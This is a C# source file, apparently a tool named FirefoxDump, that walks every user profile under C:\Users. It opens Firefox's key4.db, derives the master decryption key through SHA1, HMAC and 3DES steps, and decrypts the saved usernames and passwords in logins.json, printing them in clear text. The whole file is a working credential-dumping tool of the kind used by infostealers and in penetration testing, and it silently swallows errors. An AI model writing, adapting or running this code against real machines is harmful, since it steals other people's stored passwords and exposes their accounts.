using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Text;
using System.Data.SQLite;
using System.Security.Cryptography;
using Newtonsoft.Json.Linq;

namespace FirefoxDump.Web
{
    public static class Firefox
    {
        public static byte[] MasterIV { get; set; }

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static byte[] Combine(byte[] first, byte[] second)
        {
            byte[] ret = new byte[first.Length + second.Length];
            Buffer.BlockCopy(first, 0, ret, 0, first.Length);
            Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
            return ret;
        }

        public static string DES3(byte[] key, byte[] iv, byte[] encryptedData)
        {
            byte[] results;

            var tripDES = new TripleDESCryptoServiceProvider
            {

                // Set Key
                Key = key,

                // Set IV
                IV = iv,

                // Use CBC for mode
                Mode = CipherMode.CBC,

                // Zero Padding
                Padding = PaddingMode.Zeros
            };

            byte[] data = null;
            ICryptoTransform enc = null;

            enc = tripDES.CreateDecryptor();
            data = encryptedData;

            try
            {
                results = enc.TransformFinalBlock(data, 0, data.Length);
            }
            finally
            {
                tripDES.Clear();
            }

            return Encoding.ASCII.GetString(results);
        }

        public static byte[] decrypt3DES(byte[] globalSalt, byte[] entrySalt, byte[] encryptedData)
        {
            using (var sha1 = new SHA1Managed())
            {
                var hp = sha1.ComputeHash(globalSalt);
                var NullChars = String.Concat(Enumerable.Repeat("\x00", (20 - entrySalt.Length)));
                var pes = Combine(entrySalt , Encoding.ASCII.GetBytes(NullChars));
                byte[] rv = Combine(hp, entrySalt);
                byte[] pv = Combine(pes, entrySalt);
                var chp = sha1.ComputeHash(rv);
                HMACSHA1 hmac = new HMACSHA1(chp);
                var k1 = hmac.ComputeHash(pv);
                var tk = hmac.ComputeHash(pes);
                byte[] tv = Combine(tk, entrySalt);
                var k2 = hmac.ComputeHash(tv);
                var k = Combine(k1, k2);
                var iv = new byte[8];
                var key = new byte[24];
                Array.Copy(k, 32, iv, 0, 8);
                Array.Copy(k, 0, key, 0, 24);

                //Console.WriteLine("Key: " + ByteArrayToString(key));
                //Console.WriteLine("IV: " + ByteArrayToString(iv));

                MasterIV = iv;

                byte[] results;

                var tripDES = new TripleDESCryptoServiceProvider
                {

                    // Set Key
                    Key = key,

                    // Set IV
                    IV = iv,

                    // Use CBC for mode
                    Mode = CipherMode.CBC,

                    // Zero Padding
                    Padding = PaddingMode.Zeros
                };

                byte[] data = null;
                ICryptoTransform enc = null;

                enc = tripDES.CreateDecryptor();
                data = encryptedData;

                try
                {
                    results = enc.TransformFinalBlock(data, 0, data.Length);
                }
                finally
                {
                    tripDES.Clear();
                }

                return results;
            }
        }

        
        public static Dictionary<string, string> decodeLoginData(byte[] data)
        {
            var kvpList = new Dictionary<string, string>();

            var base64Decoded = Convert.FromBase64String(Encoding.UTF8.GetString(data));
            var asn = new Cryptography.Asn1Der();

            var parsedData = asn.Parse(base64Decoded);
            //Console.WriteLine(parsedData);

            /*
             * SEQUENCE {
                   SEQUENCE {
                        OCTETSTRING F8000000000000000000000000000001
                        OBJECTIDENTIFIER 2A864886F70D0307
                        OCTETSTRING 34E18A54D558AB3E                 <------- iv
                        OCTETSTRING D59EC72A4DDB13C2972846426DF2D46F <------- ciphertext
                        OCTETSTRING D59EC72A4DDB13C2972846426DF2D46F
                            }
                        }
             * 
             */

            var tokens = parsedData.ToString().Split(new[] { "OCTETSTRING" }, StringSplitOptions.None);
            var saltString = tokens[2].Split('\r').Select(p => p.Trim()).ToList();
            var cipherString = tokens[3].Split('\r').Select(p => p.Trim()).ToList();

            kvpList.Add(saltString[0], cipherString[0]);
            return kvpList;
        }

        public static IDictionary<IDictionary<string, string>, IDictionary<string, string>> GetLoginData(string fileName)
        {
            JToken _usernamepass;
            _usernamepass = JToken.Parse(File.ReadAllText(fileName));

            var credsChild = _usernamepass["logins"] as JArray;

            IDictionary<IDictionary<string, string>, IDictionary<string, string>> kvpList = new Dictionary<IDictionary<string, string>, IDictionary<string, string>>();

            //Dictionary<string, string> kvpList = new Dictionary<string, string>();
            foreach (var creds in credsChild)
            {
                // parsing breaks if included
                if (creds["hostname"].ToString() == "chrome://FirefoxAccounts")
                {
                    continue;
                }
                else
                {
                    var username = creds["encryptedUsername"].ToString();
                    var password = creds["encryptedPassword"].ToString();
                    var usernameBytes = Encoding.UTF8.GetBytes(username);
                    var passBytes = Encoding.UTF8.GetBytes(password);
                    kvpList.Add((decodeLoginData(usernameBytes)), (decodeLoginData(passBytes)));
                }
                
            }
            return kvpList;
        } 

        public static void printCreds(byte[] key, string loginjson)
        {
            IDictionary<IDictionary<string, string>, IDictionary<string, string>> loginData = GetLoginData(loginjson);

            foreach (KeyValuePair<IDictionary<string, string>, IDictionary<string, string>> item in loginData)
            {
                //Console.WriteLine("Key: {0}, Value: {1}", item.Key.ElementAt(0).Key, item.Value.ElementAt(0).Value);
                var userIV = StringToByteArray(item.Key.ElementAt(0).Key);
                var userCipher = StringToByteArray(item.Key.ElementAt(0).Value);
                var user = DES3(key, userIV, userCipher);
                var passIV = StringToByteArray(item.Value.ElementAt(0).Key);
                var passCipher = StringToByteArray(item.Value.ElementAt(0).Value);
                var password = DES3(key, passIV, passCipher);
                Console.WriteLine("UserName: {0}, Password: {1}", user, password);
            }
        }

        public static void DumpCreds()
        {
            var dirPath = "C:\\Users";
            string loginjson;
            byte[] key = null;
            var dirs = new List<string>(Directory.EnumerateDirectories(dirPath));

            try
            {
                foreach (var dir in dirs)
                {
                    var Path = dir + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";

                    if (!Directory.Exists(Path))
                    {
                        continue;
                    }
                    var ProfilePath = Directory.GetDirectories(Path, "*.default");
                    var KeyPath = ProfilePath[0] + "\\key4.db";
                    loginjson = ProfilePath[0] + "\\logins.json";

                    var m_dbConnection = new SQLiteConnection("Data Source=" + KeyPath + ";Version=3;");
                    m_dbConnection.Open();
                    
                    string sql = "SELECT item1,item2 FROM metadata WHERE id = 'password'";

                    byte[] global_salt = null;
                    byte[] item2 = null;
                    using (var cmd = new SQLiteCommand(sql, m_dbConnection))
                    {
                        using (var rdr = cmd.ExecuteReader())
                        {
                            while (rdr.Read())
                            {
                                global_salt = (byte[])rdr.GetValue(0);
                                item2 = (byte[])rdr.GetValue(1);
                            }
                        }
                    }

                    var asn = new Cryptography.Asn1Der();

                    var parsedData = asn.Parse(item2);
                    //Console.WriteLine(parsedData);
                    //Asn1.AsnElt asn_AS_REP = Asn1.AsnElt.Decode(item2, false);
                    
                    byte[] entry_salt_byte = new byte[20];
                    byte[] cipher_text_byte = new byte[16];
                    byte[] cipher_text_byte_new = new byte[32];

                    // This is very bad hack! If you want to do it properly, read from the parsed ASN1 data!!
                    Array.Copy(item2, 21, entry_salt_byte, 0, 20);
                    Array.Copy(item2, 46, cipher_text_byte, 0, 16);

                    //Console.WriteLine(ByteArrayToString(entry_salt_byte));
                    //Console.WriteLine(ByteArrayToString(cipher_text_byte));

                    var clearText = decrypt3DES(global_salt, entry_salt_byte, cipher_text_byte);
                    var clearString = Encoding.ASCII.GetString(clearText);
                    //Console.WriteLine(ByteArrayToString(clearText));
                    //Console.WriteLine();

                    byte[] a11 = null;
                    byte[] a102 = null;
                    if (clearString == "password-check\u0002\u0002")
                    {
                        var query = "SELECT a11,a102 FROM nssPrivate;";
                        using (var cmd = new SQLiteCommand(query, m_dbConnection))
                        {
                            using (var rdr = cmd.ExecuteReader())
                            {
                                while (rdr.Read())
                                {
                                    a11 = (byte[])rdr.GetValue(0);
                                    a102 = (byte[])rdr.GetValue(1);
                                }
                            }
                        }

                        Array.Copy(a11, 21, entry_salt_byte, 0, 20);
                        Array.Copy(a11, 46, cipher_text_byte_new, 0, 32);

                        //Console.WriteLine(ByteArrayToString(entry_salt_byte));
                        //Console.WriteLine(ByteArrayToString(cipher_text_byte_new));

                        var keyBytes = decrypt3DES(global_salt, entry_salt_byte, cipher_text_byte_new);
                        //Console.WriteLine("Key: " + ByteArrayToString(keyBytes));
                        //var keyBytes = StringToByteArray(ConvertStringToHex(mainKey));

                        key = new byte[24];
                        Array.Copy(keyBytes, key, 24);
                    }
                    m_dbConnection.Close();

                    printCreds(key, loginjson);

                }
            }
            catch
            {

            }
               
        }
    }
}
